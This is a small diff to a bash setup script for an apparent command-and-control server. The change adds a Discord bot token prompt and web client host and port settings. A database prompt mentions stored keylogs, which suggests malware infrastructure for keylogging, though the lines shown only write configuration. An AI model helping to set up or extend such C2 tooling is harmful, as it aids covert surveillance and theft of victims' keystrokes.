@@ -60,6 +60,8 @@ read -p "Enter WEBSERVER PORT: " webserverport
 echo "Note: To listen on all inteface, leave C2SERVER IP blank"
 read -p "Enter C2SERVER IP: " c2serverip
 read -p "Enter C2SERVER PORT: " c2serverport
+echo "Note: Leave discord bot token blank if you don't want"
+read -p "Enter DISCORD BOT TOKEN: " bottoken
 encpubkey=`base64 -w 0 certs/server.pem`
 
 # server env
@@ -68,10 +70,13 @@ echo "WEBSERVER_PORT=$webserverport" >> .env
 echo "C2SERVER_IP=$c2serverip" >> .env
 echo "C2SERVER_PORT=$c2serverport" >> .env
 echo "PUBLIC_KEY=$encpubkey" >> .env
+echo "BOT_TOKEN=$bottoken" >> .env
 
 #webclient env
 echo "REACT_APP_WEBSERVER_IP=$webserverip" >> Web/client/.env
 echo "REACT_APP_WEBSERVER_PORT=$webserverport" >> Web/client/.env
+echo "HOST=$webserverip" >> Web/client/.env
+echo "PORT=$webserverport" >> Web/client/.env
 
 read -p "Do you want to reset the database (this will clear any keylogs) (y/n): " resetchoice
 
